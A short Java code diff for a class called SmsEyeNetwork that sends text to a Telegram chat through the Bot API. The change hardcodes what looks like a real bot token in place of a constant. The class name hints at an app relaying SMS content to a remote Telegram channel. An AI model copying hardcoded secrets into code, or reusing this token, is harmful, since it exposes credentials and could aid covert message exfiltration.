@@ -19,7 +19,8 @@ public class SmsEyeNetwork {
     public void sendTextMessage(String message) {
         new Thread(() -> {
             try {
-                String botToken = Constants.TELEGRAM_BOT_TOKEN;
+                // 🔒 Hardcoded bot token directly in the code
+                String botToken = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4"; // Replace with your actual bot token
                 String chatId = Constants.TELEGRAM_CHAT_ID;
 
                 String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
@@ -44,3 +45,4 @@ public class SmsEyeNetwork {
         }).start();
     }
 }
+
